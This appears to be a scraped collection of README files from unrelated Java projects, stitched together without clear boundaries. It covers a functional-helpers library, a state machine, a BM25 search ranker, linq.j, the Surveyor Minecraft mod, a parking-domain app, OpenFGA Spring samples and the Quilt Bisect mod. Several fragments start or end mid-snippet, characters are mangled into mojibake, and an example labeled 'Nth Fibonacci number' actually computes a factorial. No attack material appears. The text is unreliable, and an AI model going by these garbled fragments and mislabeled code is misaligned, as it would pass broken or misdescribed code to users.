`lazy` returns `Lazy` instance with given initializer. `lazyOfValue` returns `Lazy` instance of given value.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### `Opt` object

The `Opt` monad is similar in meaning to Java `Optional`, but allows the null value.

`Opt` monad contains some `Optional` methods and scope functions methods.

```
String result = Opt.of(value).takeIf(it -> it.length() > 10).orElse("""");

String result = Opt.of(value).takeNonNull().orElseGet(() -> """");

String result = Opt.of(value).takeIf(it -> it.length() > 10).orElseThrow(() -> new IllegalArgumentException());
```

### `Lazy` object

`Lazy` represents a value with lazy initialization.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### Unchecked functions

All presented functions allow you to not process checked exceptions.

```
public static void main(String[] args) {
  URI uri = let(() -> new URI(""abc""));
}
```

### Examples

#### Collection initialization

```
Map<String, Integer> map = let(new HashMap<>(), it -> {
  it.put(""val1"", 1);
  it.put(""val2"", 2);
});

List<String> list = let(new ArrayList<>(), it -> {
  it.add(""val1"");
  it.add(""val2"");
});
```

#### Argument in a method chain

```
new MyBuilder()
  .setFirst(""first"")
  .setSecond(""second"")
  .setThird(let(() -> {
    //...
    return ""third"";
  }))
  .setFourth(""fourth"")
  .build()
```

#### Nth Fibonacci number

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

#### Method argument processing

```
public static String checkNonNullNonEmptyStr(String value) {
  return opt(value)
    .takeNonNull().throwIfEmpty(NullPointerException::new)
    .takeUnless(String::isEmpty).throwIfEmpty(IllegalArgumentException::new)
    .get();
}
```

#### Safe resources

```
class MyResource implements AutoCloseable {
  //...
}

withResource(new MyResource(), it -> {
  //...
});
```

weilueluo/tsm4j,master,"# tsm4j

A tiny, in-memory, zero dependency state machine library

## Install

### Gradle
```
implementation 'com.tsm4j:tsm4j:1.1.0'
```

### Maven
```xml
<dependency>
    <groupId>com.tsm4j</groupId>
    <artifactId>tsm4j</artifactId>
    <version>1.1.0</version>
</dependency>
```

## Usage

### Example
An example of defining and running a state machine:

```java
StateMachine<TestState> stateMachine = StateMachineBuilder.from(TestState.class)
    .addTransition(TestState.HUNGRY, TestState.MAKE_FOOD)
    .addTransition(TestState.MAKE_FOOD, TestState.FOOD_IS_READY)
    .addTransition(TestState.FOOD_IS_READY, TestState.EAT_FOOD)
    .addTransition(TestState.EAT_FOOD, TestState.FULL)
    .build();

assertThat(stateMachine.send(TestState.HUNGRY).reached(TestState.FULL)).isTrue();
```

You can bind a listener which is called whenever some state(s) is reached
```java
StateMachine<TestState> stateMachine = StateMachineBuilder.from(TestState.class)
    .addTransition(TestState.NO_FOOD, TestState.MAKE_FOOD)
    .addListener(TestState.MAKE_FOOD, context -> {
        System.out.println(""making food..."");
        context.queue(TestState.FOOD_IS_READY);
    })
    .addListener(debugLoggingListener())
    .build();

assertThat(stateMachine.send(TestState.NO_FOOD).reached(TestState.FOOD_IS_READY)).isTrue();
```

### More Examples
see tsm4j/test.

## About the older version
In short, it was going in the wrong direction, we should separate state machine from action.

mytang0/brook,main,"# Brook

Brook is an orchestration engine, supports microservices and in-app logic (embedded use) orchestration. With the embedded mode, users can effortlessly build their own workflow orchestration engine.

## Getting started

In order to maximize the lightweight nature of the Brook engine, a deliberate separation is made between its core components (which depend solely on a few essential toolkits) and the middleware extensions using SPI (Service Provider Interface). Consequently, regardless of the application implementation framework, one can seamlessly rely on the engine JAR and initialize the relevant instances.

### Maven dependency

Specify the version appropriate for the project, see [releases](https://github.com/mytang0/brook/releases).
```xml
<properties>
    <dubbo.version>...</dubbo.version>
</properties>
```

#### Not using Spring

```xml
<dependencies>
    <dependency>
        <groupId>xyz.mytang0.brook</groupId>
        <artifactId>>brook-engine</artifactId>
        <version>${brook.version}</version>
    </dependency>
</dependencies>
```

#### Springboot (recommend)

```xml
<dependencies>
    <dependency>
        <groupId>xyz.mytang0.brook</groupId>
        <artifactId>>brook-spring-boot-starter</artifactId>
        <version>${brook.version}</version>
    </dependency>
</dependencies>
```

### Demo

After cloning the repository, the demo is located in the brook-demo module.
The definition of the testing process is located at 'resources/META-INF/flows'.

stephanj/BM25,master,"# BM25 Java Implementation

BM25 (Best Matching 25) is a ranking function used by search engines to rank matching documents according to their relevance to a given search query.

See also https://en.wikipedia.org/wiki/Okapi_BM25

# Simple usage

```java
List<String> corpus = List.of(
      ""I love programming"",
      ""Java is my favorite programming language"",
      ""I enjoy writing code in Java"",
      ""Java is another popular programming language"",
      ""I find programming fascinating"",
      ""I love Java"",
      ""I prefer Java over Python""
  );

  BM25 bm25 = new BM25(corpus);

  List<Map.Entry<Integer, Double>> results = bm25.search(""I love java"");

  for (Map.Entry<Integer, Double> entry : results) {
      System.out.println(""Sentence "" + entry.getKey() + "" : Score = "" + entry.getValue() + "" - ["" + corpus.get(entry.getKey()) + ""]"");
  }
```

```
Sentence 5 : Score = 2.286729869084079 - [I love Java]
Sentence 0 : Score = 1.8387268317084793 - [I love programming]
Sentence 6 : Score = 0.7294916714788526 - [I prefer Java over Python]
Sentence 2 : Score = 0.6674701123652661 - [I enjoy writing code in Java]
Sentence 4 : Score = 0.40211004330297734 - [I find programming fascinating]
Sentence 1 : Score = 0.33373505618263305 - [Java is my favorite programming language]
Sentence 3 : Score = 0.33373505618263305 - [Java is another popular programming language]
```

```Java
bm25.search(""programming"");
```

```
Sentence 0 : Score = 0.687935390645563 - [I love programming]
Sentence 4 : Score = 0.6174639603843102 - [I find programming fascinating]
Sentence 1 : Score = 0.5124700885780712 - [Java is my favorite programming language]
Sentence 3 : Score = 0.5124700885780712 - [Java is another popular programming language]
Sentence 2 : Score = 0.0 - [I enjoy writing code in Java]
Sentence 5 : Score = 0.0 - [I love Java]
Sentence 6 : Score = 0.0 - [I prefer Java over Python]
```

# With stop words 

Get better results by removing language-specific stop words. 

Based on ISO provided list from https://github.com/stopwords-iso 

Current implementation supports English, French, German, Dutch, Italian and Spanish stop words.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH);
```

# With Stemming

Get better results by using stemming. 

Stemming maps different forms of the same word to a common ""stem"". 
For example, the English stemmer maps running, run, runs to run. 
So a search for 'running' would also find documents which only have the other forms.

```Java
      BM25 bm25 = new BM25(corpus, StopWords.ENGLISH, new EnglishStemmer());
```

The default implementation uses the Porter2 stemmer from Snowball.  
You can add other Stemmer implementations, for example, CoreNLP or Lucene.

### Linq is Object oriented sql, linq is actually a query on the data in memory, enabling developers to write queries more easily. These query expressions look a lot like SQL

> You can join, filter, sort, and group data sources with minimal code. These operations can be combined in a single query to obtain more complex results

#### allows you to write Java code that manipulates in-memory data in the same way that you query a database, for example
- List, Array
- SQL result data
- CSV, XML, JSON document datasets
- Stream, File stream

#### Application Scenarios
- Result association for RPCS such as Feign/Dubbo during distributed development
- In-memory computation of heterogeneous system data
- Use code to organize SQL result data
- Sorted aggregation of multiple result objects with in-memory paging
- Semantic object transformation and mapping
- Clean code, no need for loops and branches to manipulate data
- Federated access across data sources

#### Operation syntax
`From` `Select` `Distinct`„ÄÅ`Join`„ÄÅ`Where`„ÄÅ`Group By`„ÄÅ`Order By`„ÄÅ`Limit`„ÄÅ`Offset`„ÄÅ`...`

#### Tips
‚ö†Ô∏è Note: The object field must have a get method to facilitate lambda lookup. It is recommended to use the **Lombok** @Getter annotation to quickly create get access to the field

#### How to Use
It has zero external dependencies and is only 50kb in size
```xml
<dependency>
    <groupId>xyz.erupt</groupId>
    <artifactId>linq.j</artifactId>
    <version>0.0.5</version>
</dependency>
```

#### Example 1
```javascript
var strings = Linq.from(""C"", ""A"", ""B"", ""B"").gt(Th::is, ""A"").orderByDesc(Th::is).write(String.class);
// [C, B, B]

var integers = Linq.from(1, 2, 3, 7, 6, 5).orderBy(Th::is).write(Integer.class);
// [1, 2, 3, 5, 6, 7]

var name = Linq.from(data)
    // left join
    .innerJoin(target, Target::getId, Data::getId)
    // where like
    .like(Data::getName, ""a"")
    // select name
    .select(Data::getName)
    // distinct
    .distinct()
    // order by 
    .orderBy(Data::getName)
    .write(String.class);

```

### Player Usage

> *Surveyor is a library for map mod developers! You shouldn't need to download it alone.*

#### Commands

* `/surveyor` - display information about your map exploration, including sharing.
* `/surveyor share [username]` - request/accept sharing map exploration with a player.
* `/surveyor unshare` - stop sharing map exploration (leave your ""sharing group"")
* `/surveyor landmarks` - view a cross-world landmark breakdown by type.
* `/surveyor landmarks get [type]` - lists each landmark of that type in the current world.
* `/surveyor landmarks remove [type] [pos]` removes a waypoint or landmark (op 2) from the world.
* `/surveyor landmarks add [type] [pos] [name]` add a waypoint to the world at the specified position.
* `/surveyor landmarks global [type] [pos] [name]` (op 2) add a landmark to the world at the specified position.

#### Configuration

Surveyor has extensive start-time configuration in `config/surveyor.toml`.<br/>
It's various systems can be turned on and off, and map sharing tweaked finely.

---

### Library Features

**Surveyor relieves the scanning, saving, and networking responsibilities from dependent map mods.**

In general, Surveyor:

* Records terrain, structure, and ""landmark"" data suitable for maps as the world is changed.
* Enables live map sharing between players by tracking individual exploration of the map.
* Sends the client structures as they're discovered or shared.
* Syncs map data and landmarks (e.g. waypoints) when sharing or on client data loss.
* Exposes a generic API for map mod integrations (e.g. adding map markers to important locations).
* Only adds 2-5% to save size, using an efficient format both in-memory and on-disk.

Surveyor's data **deliberately preserves key details**, designed to allow any abitrary map mod to use it:

* Terrain is a top-down view of blocks with height, biome, light level, and water depth.
* Terrain contains multiple layers, allowing for usable cave and nether maps.
* Structures have IDs, pieces, tags, and even full piece NBT for smaller structures intact.
* Landmarks generically represent other positional map data - e.g. waypoints, POIs, or faction claims.

---

**Notice: Surveyor is still in early releases.**

* The API might break several times during 0.x
* The networking format will break several times during 0.x.
* The save format will likely break on the change to 1.x
* Javadoc is very limited

	modImplementation 'folk.sisby:surveyor:0.3.0+1.20'
	include 'folk.sisby:surveyor:0.3.0+1.20'
}
```

#### Examples

* **[Antique Atlas 4](https://github.com/sisby-folk/antique-atlas)** - A stylized client-side map mod.
* **[SurveyorSurveyor](https://github.com/HestiMae/surveyor-surveyor)** - An enhanced-vanilla style java map image generator, using raw surveyor save files.
* **[Surveystones](https://github.com/sisby-folk/antique-fwaystones)** - A mixed-side addon that automatically adds landmarks for waystones from [Fabric Waystones](https://modrinth.com/mod/fwaystones/versions).

### Core Concepts

The **World Summary** holds all of surveyor's data for a world. It can be accessed using `WorldSummary.of(World)`.

**Chunk Summaries** (or the ""Terrain Summary"") represent the world viewed from above. This includes the top layer of blocks, along with their biome, height, block light level, and the depth of water above them.

**Structure Summaries** represent an in-world structure (called `StructureStart` in yarn) - they include map-critical information for identifying the structure and its pieces, even full NBT for structures with under 10 pieces, but not any actual blocks.

**Landmarks** are a way to represent all other positional information on-map. They have unique serialization per-type, and are uniquely keyed by their type and position to prevent overlaps.

**Exploration** is a record of what chunks, structures, and landmarks a player should be able to see.<br/>
A player explores a chunk when they're sent it, explores a structure when they stand in (or look at) one of its pieces, and explores an (unowned) landmark when they explore the chunk it's in.

### Terrain Summary Layers

To facilitate cave mapping, Surveyor records the top layer of blocks at **multiple height levels** (layer heights).

**The Overworld** scans for floors in these layers:

* 257-319 - usually empty
* 62-256 - surface terrain
* 0-61 - sea floors and riverbeds, ravines, and caves
* -64-0 - deepslate caves

**The Nether** scans for floors in these layers:

* 127-255 - usually flat bedrock
* 71-126 - high caves and outcrops
* 41-70 - mid-level outcrops and walkways
* 0-40 - the lava sea and shores

Roughly speaking, Surveyor will accept any non-clear solid block below a 2-high walk-space as a floor.<br/>
It will also detect ""carpets"" (non-clear non-solid blocks) above these floors and use those instead.

Surveyor supports any layer height configuration, but currently lacks the API/config to change this for specific dimensions.

Note that the amount of layers doesn't affect how mods display the map, only how often cave floors will be occluded by floors above them.

### Map Mods

<details>
<summary>Click to show the map mod guide</summary>

Quick reminder that surveyor should **replace any existing world scanning logic**<br/>
You should never need to look at the currently loaded chunks - If some information is missing, let us know!

#### Initial Setup

Client map mods should always use `SurveyorClientEvents` - this ensures only explored areas will be provided in singleplayer.

Tune into `WorldLoad` and queue up the provided keys for rendering.<br/>
This event will trigger when the client world has access to surveyor data and the player is available.

`terrain` contains all available chunks by region. `WorldTerrainSummary.toKeys()` converts this into ChunkPos.<br/>
`structures` contains all structure starts by key + ChunkPos.<br/>
`landmarks` contains all landmarks (POIs, waypoints, death markers, etc.) by type + BlockPos.

You can get these from the world summary later using `keySet()` methods - check the event implementation.<br/>
Pass in `SurveyorClient.getExploration()` to ensure unexplored areas are hidden.

##### Live Updates

Also tune into `TerrainUpdated`, `StructuresAdded`, `LandmarksAdded` to add to your render queues.<br/>
These fire whenever the client player should see something new (usually via exploration).<br/>
They can also fire before `ClientPlayerLoad`, so let any of them create your map data.

Tune into `LandmarksRemoved` as well but without a queue - just remove from your map/queue directly.

#### Terrain Rendering

First, generate a top layer (with any desired height limits) using `get(ChunkPos).toSingleLayer()`.<br/>
This will produce a raw layer summary of one-dimensional arrays:

* **exists** - True where a floor exists, false otherwise - where false, all other fields are junk.
* **depths** - The distance of the floor below your specified world height. so y = worldHeight - depth.
* **blocks** - The floor block. Indexed per-region via `getBlockPalette(ChunkPos)`.
* **biomes** - The floor biome. Indexed per-region via `getBiomePalette(ChunkPos)`.
* **lightLevels** - The block light level directly above the floor (i.e. the block light for its top face). 0-15.
* **waterLights** - The block light level directly above the water's surface (if there is one). 0-15.
* **waterDepths** - How deep the contiguous water above the floor is.
	* All other liquid surfaces are considered floors, but water is special-cased.
	* The sea floor (e.g. sand) is recorded, and this depth value indicates the water surface instead.
	* This allows maps to show water depth shading, but also hide water completely if desired.

All arrays can be indexed by `x * 16 + z`, where x and z are relative to the chunk.<br/>
Use these arrays to render and store map data for that chunk (pixels, buffers, whichever).<br/>
Remember that you'll be rendering hundreds of thousands of chunks here - optimize this process hard.

#### Structure Rendering

Along with the key and ChunkPos, you can get the type and any tags using `getType(key)` and `getTags(key)`.

You can access a full summary of the structure (e.g. to draw its bounding boxes) using `get(key, ChunkPos)`.<br/>
This includes piece data like boxes, direction, IDs, etc.

#### Landmark Rendering & Management

Along with the type and BlockPos, you can get a full landmark using `get(type, BlockPos)`.

By default, this can include a dye color, a text name, the owner's UUID, and a texture (could be from another map mod).<br/>
You should have a method of rendering a landmark using just this information.

To improve how landmarks are displayed, you can use `instanceof` to check for additional data, e.g. `HasBlockBox`.

To add a waypoint landmark, just make a `SimplePointLandmark` owned by the player and use `put(Landmark)`.<br/>
This will save to disk and send a copy to the server.

#### Player Rendering

You can use `SurveyorClient.getFriends()` to get a set of players to draw on the map.

This includes both the client player, online ""friends"" (map sharing group members), and offline friends.

The players are represented abstractly, providing UUID, username, global position, yaw, and online status.

</details>

### Landmark Integrations

<details>
<summary>Click to show the landmark integration guide</summary>

Landmark types can be registered via the registry in `Landmarks`.<br/>
This allows you to set and serialize custom data relevant to your landmark.<br/>
Your landmark can usually be a record. Check the [builtins](https://github.com/sisby-folk/surveyor/tree/1.20/src/main/java/folk/sisby/surveyor/landmark) for an example.

To make extra landmark data accessible to map mods, always declare a new `Has` interface to access it from.

To place a landmark, just use `WorldSummary.of(world).landmarks().put(Landmark)`.<br/>
This works fine on either side - adding a landmark on the server will send it to the client and vice-versa.

Landmark types can't yet have fallback types - so use a simple type (or PR a new one!) if your mod is only on one side.

</details>

# Parking Domain - [contest 100 commits](https://100commitow.pl/)

> Studying the business domain before its implementation is the best decision you can make.

The Parking Domain project aims to demonstrate the evolution from a rudimentary and limited model to a more
sophisticated solution. I'm committed to undertaking this challenge and seeing if I can successfully navigate it. üòé

This is just experiment which serves solely for **educational purposes**. While I will define the MVP and other
necessary aspects, it's important to note that this domain is not the ultimate goal itself.

**Let‚Äôs dive into the code and see where it takes us!**

## FAQ

### How to run app locally?

The best way to run app locally is to use below command.

```shell
mvn spring-boot:run -Dspring-boot.run.profiles=local
```

App will be running with in-memory databases and with initial data in them.

### How to run app with Postgres database?

First of all we will need [Docker](https://www.docker.com/) to run Postgres database.

```shell
docker run -d -p 5432:5432 -e POSTGRES_PASSWORD={secret} -e POSTGRES_USER={username} postgres:16.4
```

Then we are able to run ""production-ready"" version of app.

```shell
mvn spring-boot:run
```

Because of lacking GUI in this project I prepared [Bruno](https://www.usebruno.com/) files to call APIs
(Open Source substitution for Postman) to interact with application.

![Example of Bruno usage](docs/public/bruno_usage.png)

### Is it production-ready?

Could be... I wrote some tests to check if application is working. Also, I use it with simulation of time passing.
It works, but there could be some corner cases which could cause unexpected problems.

### Why parking domain?

Don't know. I experimented with implementing the voting and vaccination domains, deliberately writing ugly code for
educational purposes. However, the outcome left me feeling discouraged. I've shared this experience
on [my blog \[PL\]](https://cezarysanecki.pl/2024/02/13/prezentacja-prostej-domeny/). I'm hopeful that coding an anemic
model for the parking domain won't result in the same challenges as my previous attempts. Interestingly, I came across
this domain in one of the [DevMentors YouTube videos](https://www.youtube.com/@DevMentorsPL/videos), and I thought, ""Why
not give it a try?""

### Why Java and Spring?

Because it's my ""native"" background, and my goal isn't to learn a new language. I aim to learn how to model a domain
with existing legacy code and explore tools from the JVM ecosystem (but not exclusively).

## MVP

- [ ] ~~3-layer app with anemic model (without tests)~~
- [ ] Added business logic
    - [X] Occupation
    - [X] Requests
    - [X] Reservations
- [X] Refactoring multiple times to find ""the best"" solution
- [X] Looking for deep model (modules)
    - [X] Do simple Event Storming session
- [X] Add other types of requirements
    - [X] Simple fee logic
    - [X] Cleaning
    - [X] Notifications about reservations

## Business context

This software is being developed for a client who owns a parking facility near a shopping center and offices. Presently,
anyone can park there for a small fee. However, this setup is frustrating for both the business and its clients. The
business earns only a modest amount, while clients struggle to find parking due to constant occupations.

The business aims to address this situation by implementing software that enables users to reserve parking spots for
specific times of the day. Additionally, the software will optimize parking utilization by allowing multiple small
vehicles to occupy a single parking spot. Further requirements are outlined below.

### Parking

- Parking is available **since 5am until 1am**
    - Clients can only occupy parking spots **until 12pm**
    - The last hour is reserved for reminders about releasing parking spots and towing
- There is technical break **since 1am until 5am**
- Parking spots have their own identity
- Parking spots are assigned to groups: BRONZE, SILVER, GOLD (attractiveness spot)
    - [WARNING] Not used for business logic, just markers
- Parking spots can be occupied (for now) by: cars, motorcycles and scooters
- Every parking spot has its own capacity (for now it is 4 units)
- On parking spot can park different combinations of vehicle types f.ex.
    - One vehicle (1 x 4)
    - Two motorcycles (2 x 2)
    - One motorcycles and two scooters (1 x 2 + 2 x 1)
    - Four scooters (4 x 1)
- One occupant can occupy only one spot on parking spot (whole or part of it)

### Requesting parking spot

- There is limit for requests according to client type:
    - individual - only one
    - business - at most twenty
- Client can request any parking spot by its id pointing how many units are required for him
- Request is not valid reservation
- Request can be made, cancelled until they become valid (become reservations) at 1am
- Requests can be made for
    - first part of day (5:00-17:00)
    - second part of day (18:00-24:00)

### Reservations

- Reservation can be used to park on parking spot
- If a client fails to fulfill a reservation he will be charged for not used reservation
- Clients who are on reserved parking spot will be notified that they should free parking spot

### Cleaning parking spots

- Parking spots can be cleaned during technical break
- Cleaning service is called when 10 parking spots are considered dirty
    - It means 20 releases

### Fee

- [WARNING] There should be price list
- Fee for not using reservation is 50$

## Analysis

### Timeline model [PL] - Overall view

I would like to learn the following technologies/tools. I need to consider which of them to use
in the current project during the MVP phase.

- [X] Implementation
  - [X] Unit/Integration tests (Protect business logic) + TestContainers if needed
  - [X] Split domains/hexagonal architecture
- [X] JOOQ
- [ ] Save form vs Save state per field

# fast-spring-test
The unit test speed-up tool draws on spring test's support for integration testing, so that unit tests can also reuse the spring container without restarting the spring container to achieve the purpose of rapid unit testing. It supports multiple test engines junit4, junit5, testNG, etc.
  
## Architecture

![Architecture](https://github.com/liubingmx/fast-spring-test/blob/main/doc/architecture.png)

## Effects


https://github.com/liubingmx/fast-spring-test/assets/20813546/00874ed7-e1b6-483c-8d3a-e40e46116142

- The first run requires starting the running environment, which takes a long time. After the second run, the container can be reused, and the unit test execution time can be down to the millisecond level. There is no need to restart when adding a single test case. The test can be hot loaded and executed directly.

jimmyjames/fga-spring-examples,main,"# Spring Security Examples with OpenFGA

Repository demonstrating use cases and possible solutions to integrate FGA with Spring Security.

## Goals

The goals of this repository are to:
- Show how OpenFGA can be integrated with Spring today
- Give insight into possible DX improvements, either through an FGA-owned starter/library, possible direct Spring Security integration, or customer guidance

## Samples

- `simple-auth` is a sample FGA integration that has a basic Spring security configured. It is a simple example that makes assumptions about users and principals.
- `resource-server` and `client-restclient` demonstrate a resource server with JWT authorization using the `okta-spring-boot-starter` and a client credentials flow to obtain a JWT to make API calls. The API's in `resource-server` are protected both by JWT and FGA checks, and are called by `client-restclient`.

## Prerequisites

- Docker
- Java 17
- [OpenFGA CLI](https://github.com/openfga/cli)

## Usage

### Simple no-auth sample

To run the `simple-auth` sample, see the [README](./simple-auth/README.md).

### Client credentials sample

This sample comprises of two parts:
- A resource server configured with the `okta-spring-boot-starter` to secure endpoints with JWTs issued by Auth0. It protects APIs with JWT authorization and uses FGA to protect endpoints and write authorization data.
- A client that uses the client credentials flow to obtain a JWT to call the resource server.

#### Create Auth0 application and API

- Create a new Auth0 API and note the API identifier
- Create a new Auth0 machine-to-machine application, and note the client ID and secret

#### Start OpenFGA and create a store and authorization model

This will start an in-memory database OpenFGA server:


```bash
docker pull openfga/openfga:latest
docker run --rm -e OPENFGA_HTTP_ADDR=0.0.0.0:4000 -p 4000:4000 -p 8081:8081 -p 3000:3000 openfga/openfga run
```

Create a store:

```bash
fga store create --name ""Example Store"" --api-url http://localhost:4000
```

You should receive a response like this. Note the store ID value:

```json
{
  ""store"": {
    ""created_at"":""2024-02-16T16:56:21.162910175Z"",
    ""id"":""01HPSDHYXAD9HS906YFG9CQM02"",
    ""name"":""Test Store"",
    ""updated_at"":""2024-02-16T16:56:21.162910175Z""
  }
}
```

Create an authorization model:

```bash
fga model write --api-url http://localhost:4000 --store-id STORE-ID-FROM-ABOVE --file ./example-auth-model.json
```

You should receive a response like this. Note the `authorization_model_id`:


```json
{
  ""authorization_model_id"":""01HPSDPTTC209FQ0P4AMK3AZPE""
}
```

#### Configure resource server

Configure the application properties:

```bash
cd resource-server
cp src/main/resources/application.yml.example src/main/resources/application.yml
```

In `application.yml`, replace the `oauth2` properties with the values from your Auth0 application and API.

Also replace the values for `fga-store-id` and `fga-authorization-model-id` with the values created above.

#### Run resource server

```bash
./gradlew bootRun
```

This will start the server on port 8082.

#### Configure the client

Configure the application properties:

```bash
cd client-restclient
cp src/main/resources/application.yml.example src/main/resources/application.yml
```

Replace the oauth2 values and `auth0-audience` with the values of your Auth0 application and API identifier.

#### Start the application

```
./gradlew bootRun
```

This will start the application, execute the client credentials grant to obtain a JWT, and then makes calls to the resource server:

- Attempt to `GET` a ""document"" for which the current principal does **not** have an FGA relation to. This request should fail with a `403`.
- A call to create a ""document"", which will create an FGA relationship associated with the principal.
- Another attempt to get the document, which should now return successfully as there is a `reader` relationship between the principal and the document.

You can see the results of these calls in the application logs.

## Implementation details

The samples demonstrate the following:

### Auto-configuration of `OpenFgaClient`

Uses custom application property values to create and make available to components an `OpenFgaClient`. This can be used by applications to interact with the FGA API directly, e.g., to write authorization data.

An application can configure the client in application properties for their usage:

```yaml
openfga.fgaApiUrl=FGA_API_URL
openfga.fgaStoreId=FGA_STORE_ID
openfga.fgaAuthorizationModelId=FGA_AUTHORIZATION_MODEL_ID
openfga.fgaApiAudience=FGA_API_AUDIENCE
openfga.fgaClientId=FGA_CLIENT_ID
openfga.fgaClientSecret=FGA_CLIENT_SECRET
...
```

Note that for simplicity purposes, this sample does not support FGA authorization, thus is NOT suitable for production use.

### Simple FGA check bean definition

A simple bean is defined to perform an authorization check:

```java
@PreAuthorize(""@openFga.check('#id', 'document', 'reader', 'user')"")
public String getDocumentWithSimpleFgaBean(@PathVariable String id) {
    return ""You have access!"";
}
```

In the example above, the currently authenticated principal's name is used as the user ID by default. It can also be explicitly passed.

### Custom `FgaCheck` annotation and aspect

A custom `@FgaCheck` annotation was created to demonstrate using an explicit FGA annotation and aspect to execute an FGA check prior to the method execution:

```java
@FgaCheck(userType=""user"", relation=""reader"", objectType=""document"", object=""#id"")
public String customAnnotation(@PathVariable String id) {
    return ""You have access!"";
}
```

Similar to the bean definition, it uses the currently authenticated principal by default for the user ID.

anonymous123-code/quilt-bisect,main,"# Quilt Bisect

A Quilt mod & loader plugin for finding mods responsible for issues using a search algorithm derived from binary search. This includes n-way mod incompatibilities.

## Usage

- This project uses Loader Plugins, `-Dloader.experimental.allow_loading_plugins=true` needs to be added to your JVM arguments.
- Put this mod into your mods folder
- If your game crashes, a dialog will open asking if you want to bisect, else click the start bisect button at the top of your screen, and you will be prompted to give your issue a name. 
- The game will automatically restart. Try to reproduce the issues you had before.
  - If everything is fine, click the `No Issue` button
  - If you have an issue click the `Manual Issue` button, and select the issue you are having or create a new one
    - Note that it is recommended to keep the number of issues in one bisect down, and instead run multiple bisects with previous fixes applied. See [Bisecting multiple issues at once](#bisecting-multiple-issues-at-once)
- once an issue is isolated, bisect will verify the solution(s) and continue bisecting the other issues
- once bisect is done, it will provide a summary of issues and solutions encountered. Please treat those with care though, [due to the way bisect works](#loading-the-right-mod-set)

### Configuring
The file `<config>/quilt_bisect/main.json` contains most things a user may want to configure, see [MainConfig.java](/src/main/java/io/github/anonymous123_code/quilt_bisect/shared/MainConfig.java) for now.

The file `<config>/quilt_bisect/active_bisect.json` contains information about the active bisect, including the settings, all tried mod sets and their respective log, and issue information.

The files `<config>/quilt_bisect/modSet.txt`, `<config>/quilt_bisect/sections.txt`, and `<config>/quilt_bisect/lastActiveJoin.txt` contain internal information and shouldn't be modified.

## How does it work
### Bisecting multiple issues at once
While bisecting multiple issues works, there are a few assumptions bisect makes that are essential when multiple issues are present:
- Only removing a mod can fix an issue, not adding one 
  - A common example for this would be indium, which fixes compatibility issues between sodium and other mods, if it wouldn't be declared by the other mods involved
- There is a constant priority order between issues 
  - If a subset B of a mod set with issue A has an issue different from issue A, issue A won't occur on any subset of B. This means that issues (even if marked by the user) must always be tested for in the same order

### Automatically mark things as working
When starting a new bisect, you can configure bisect to
- automatically join a world, server, realm, or the last joined one (Note that realms rely on ids and not on names)
- automatically accept a mod set as working after a given time
  - The time is in 1/20 seconds, and will start on world join if auto join is active, else when the title screen shows. If in single player, it will also wait for enough ticks to pass
- automatically run commands or sending chat messages after auto joining.
  - It will be treated as if you sent them from chat, and also work with client side commands
- disable world saving
  - This is to help reproduction of issues where the state of the world is relevant. No single player world will be changed after a relaunch if this is active. It also allows for testing content mods
  - For maximum compatibility it is currently implemented by making a backup of the worlds folder and resetting the worlds that have been backed up to the stored state before launch if active

### Handling crashes
Being a loader plugin, bisect hooks into the Quilt's loader process at an incredibly early stage.
There, it can create a new process that is actually running the game, and wait for that process to end.
After that bisect checks if minecraft crashed by searching for a new crash log, copies the latest.log, and updates `config/quilt_bisect/active_bisect.json`.
(if no bisect is active and it crashed it asks if a new one should be started)
If minecraft didn't quit normally (either through a crash or through the bisect menu) and a bisect is active, the parent process will restart the game.
[Behind the scenes](src/main/java/io/github/anonymous123_code/quilt_bisect/plugin/BisectPluginProcessManager.java) there is a lot more stuff going on making sure that for example killing the parent or child process makes them  behave as expected.

### Detecting issues
Bisect will
- [Handle crashes](#handling-crashes)
- (TODO) Check for log messages using regexes (if possible)
- Rely on user input

### Selecting the next mod set to test
Bisect works using an extended version of binary search:
- First, select the smallest mod set with an (unfixed) issue
- For each section of that mod set(see last row)
  - If a section simply includes one mod, that mod is required and no more work needs to be done on that section
  - Divide that section into half
  - Check those halves
    - if one has an issue, it becomes a part of the issue mod set in the next iteration
    - if all halves are working this means that in both halves are mods required for the issue to arise
      - => store those halves as separate sections and bisect those like in step 3
- if all sections only contain one element, a minimal reproduction has been isolated. Mark the corresponding issue as fixed with the resulting mod set and debug the next issue, with one of the current mods removed
- Once all of this is done, prompt the user to select which mods are to be removed

### Loading the right mod set
One of the main problems such a bisect algorithm faces are dependencies.
Ideally, a bisect method would be aware of dependencies and bisect based on those.
However, this would immensely inflate the complexity of the algorithm, and this project is complex enough right now.

Instead, Quilt Bisect simply ignores dependency in its search algorithm and provides all mods to quilt loader.
However, it only force-loads mods in the mod set (this is what happens to mods in your mods folder) and provides the other mods as optional mods which are only loaded when a dependency requires it.
While solving the dependency issue, it has a few implications:
- If required, a mod not in the mod set still can be loaded
- This means that it can happen that when bisect identifies a minimal reproduction, that reproduction set actually only includes a mod which depends on the real culprit
- This means that the mod set *can not show* which mod is at fault and that before blaming a mod some better tests must occur

## Development

For testing, I also recommend [Quilt Crasher](https://github.com/anonymous123-code/quilt-crasher), which I developed to enable testing of this kind of mod.

## Licensing

While the code is ARR, this is only to prevent ports to other mod loaders or low-effort copies. Feel free to copy parts of the code for your mod. If your mod does similar things to this mod, credit me. You can also ask for me for permission. If it's not a port to another mod loader, I'll likely agree.

mariofusco/quarkus-drools-llm,main,"# Machine Learning + Symbolic Reasoning: a Quarkus story on Artificial Intelligence

| Hybrid Reasoning in a nutshell | 
|---| 
| Hybrid reasoning, also known as [Neuro-symbolic AI](https://en.wikipedia.org/wiki/Neuro-symbolic_AI), is a type of artificial intelligence mixing Machine Learning and Symbolic Reasoning in order to complement each other, covering with second the areas where the first falls short, like the lacks of reliability, reproducibility and transparency.<br/><br/>The main idea behind this project is showing, with simple but compelling examples, how hybrid reasoning, and in particular how mixing an LLM with a rule engine, could allow to implement chatbots in different business domains that are both user-friendly and capable of applying the business rules of that specific domain in a rigorous way and without suffering of any hallucinations. |

## Power is nothing without control

